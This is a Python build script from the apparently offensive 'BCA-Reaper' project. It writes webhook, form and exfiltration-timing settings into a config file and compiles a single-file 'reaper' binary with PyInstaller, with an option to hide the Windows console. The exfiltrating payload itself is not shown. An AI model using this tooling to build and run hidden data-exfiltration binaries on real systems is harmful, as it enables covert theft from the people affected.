#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = "EONRaider @ keybase.io/eonraider"

import argparse
from platform import system

import PyInstaller.__main__ as pyinstaller


def build(args: argparse.Namespace) -> None:
    """Set up the arguments required by PyInstaller to build the Reaper
    binary."""

    config = {
        "webhook": args.webhook,
        "forms": args.forms,
        "exfil_time": args.exfil_time
    }

    with open(file="src/config.py", mode="w") as config_file:
        for key, value in config.items():
            value = value if not isinstance(value, str) else f"'{value}'"
            config_file.write(f"{key} = {value}\n")

    file_name = args.name if args.name is not None else \
        f"{system().lower()}_reaper"

    cmd = [
        "src/reaper.py", "--onefile",
        "--hidden-import", "config",
        "--name", file_name
    ]

    if args.dest_dir is not None:
        cmd.append(args.dest_dir)

    if args.no_console is True:
        cmd.append("--noconsole")

    pyinstaller.run(cmd)


if __name__ == "__main__":
    from src.reaper import parse_cli

    _args = parse_cli()
    _args.add_argument(
        "--name",
        type=str,
        help="Name of the generated binary. Defaults to $SYSTEM_reaper, where "
             "$SYSTEM is the name of the OS where the compilation takes place."
    )
    _args.add_argument(
        "--dest-dir",
        type=str,
        help="Absolute path to a directory to write the binary file. Defaults "
             "to ./dist if unset."
    )
    _args.add_argument(
        "--no-console",
        action="store_true",
        help="Set to prevent Windows from opening a console during execution "
             "of the application."
    )

    build(_args.parse_args())
